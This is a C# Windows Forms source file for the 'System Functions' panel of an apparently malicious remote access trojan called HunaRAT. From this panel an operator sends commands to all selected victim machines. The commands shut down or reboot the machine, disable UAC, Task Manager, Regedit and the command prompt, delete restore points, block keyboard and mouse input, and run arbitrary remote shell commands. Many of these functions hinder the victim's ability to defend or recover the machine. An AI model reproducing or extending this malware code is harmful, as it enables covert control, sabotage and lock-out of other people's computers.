using GoldenEye_Remote_Administration_Tool;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace HunaRAT.Forms
{
    public partial class SystemFunctions : Form
    {
        public List<Connection> Clientlist = new List<Connection>();

        private void send(string command)
        {
            foreach (Connection clientt in Clientlist)
            {
                clientt.Send("SYSFUNCS|" + command);
            }
        }

        public SystemFunctions()
        {
            InitializeComponent();
        }

        private void SystemFunctions_Load(object sender, EventArgs e)
        {
            themeContainer1.Text = "System Functions - " + Clientlist.Count.ToString() + " Clients selected";
        }

        private void themeContainer1_Click(object sender, EventArgs e)
        {
        }

        private void button1_Click(object sender, EventArgs e)
        {
            send("shutdown");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            send("reboot");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            send("logoff");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            send("hibernate");
        }

        private void button5_Click(object sender, EventArgs e)
        {
            send("monitorON");
        }

        private void button6_Click(object sender, EventArgs e)
        {
            send("monitorOFF");
        }

        private void button12_Click(object sender, EventArgs e)
        {
            send("cursorSHOW");
        }

        private void button11_Click(object sender, EventArgs e)
        {
            send("cursorHIDE");
        }

        private void button10_Click(object sender, EventArgs e)
        {
            send("showTaskbar");
        }

        private void button9_Click(object sender, EventArgs e)
        {
            send("hideTaskbar");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            send("ejectTray");
        }

        private void button7_Click(object sender, EventArgs e)
        {
            send("closeTray");
        }

        private void button24_Click(object sender, EventArgs e)
        {
            send("enableCMD");
        }

        private void button23_Click(object sender, EventArgs e)
        {
            send("disableCMD");
        }

        private void button22_Click(object sender, EventArgs e)
        {
            send("enableRegedit");
        }

        private void button21_Click(object sender, EventArgs e)
        {
            send("disableRegedit");
        }

        private void button18_Click(object sender, EventArgs e)
        {
            send("enableTaskMGR");
        }

        private void button17_Click(object sender, EventArgs e)
        {
            send("disableTaskMGR");
        }

        private void button16_Click(object sender, EventArgs e)
        {
            send("deleteRestorePoints");
        }

        private void button15_Click(object sender, EventArgs e)
        {
            send("disableUAC");
        }

        private void button14_Click(object sender, EventArgs e)
        {
            send("enableInput");
        }

        private void button13_Click(object sender, EventArgs e)
        {
            send("disableInput");
        }

        private void button20_Click(object sender, EventArgs e)
        {
            send("swapButtons");
        }

        private void button19_Click(object sender, EventArgs e)
        {
            send("normalButtons");
        }

        private void button25_Click(object sender, EventArgs e)
        {
            send("speech|" + t_TextBox1.Text.Replace("|", "/"));
        }

        private void button26_Click(object sender, EventArgs e)
        {
            send("shellcmd|" + t_TextBox2.Text.Replace("|", ""));
        }
    }
}